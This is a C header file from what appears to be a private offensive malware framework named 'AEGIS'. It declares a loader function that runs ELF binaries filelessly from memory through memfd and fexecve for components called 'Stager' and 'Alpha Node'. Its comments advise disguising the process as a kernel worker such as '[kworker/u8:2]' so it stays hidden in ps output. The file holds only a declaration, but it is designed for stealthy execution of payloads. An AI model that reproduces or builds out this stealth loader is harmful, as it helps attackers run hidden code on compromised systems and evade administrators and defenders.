/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Shared Loader Logic
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : common/loader.h
 *  Purpose        : Provides the fileless execution capability (memfd + fexecve)
 *                   used by multiple components (Stager, Alpha Node).
 * ============================================================================
 */

#ifndef AEGIS_LOADER_H
#define AEGIS_LOADER_H

#include "types.h"
#include <stddef.h>
#include <stdint.h>

/*
 * aegis_exec_from_memory — Execute an ELF binary entirely from memory.
 *
 * @binary:      Pointer to the ELF binary data.
 * @len:         Length of the binary data.
 * @proc_name:   Name to assign to the process (e.g., "[kworker/u8:2]").
 *               This appears in `ps` output.
 * @argv:        Argument vector (NULL-terminated). If NULL, uses {proc_name, NULL}.
 * @envp:        Environment vector (NULL-terminated). If NULL, inherits or uses empty.
 *
 * Returns:      AEGIS_OK on success (though successful exec never returns),
 *               or an error code on failure.
 */
aegis_result_t aegis_exec_from_memory(const uint8_t *binary, size_t len,
                                      const char *proc_name,
                                      char *const argv[],
                                      char *const envp[]);

#endif /* AEGIS_LOADER_H */
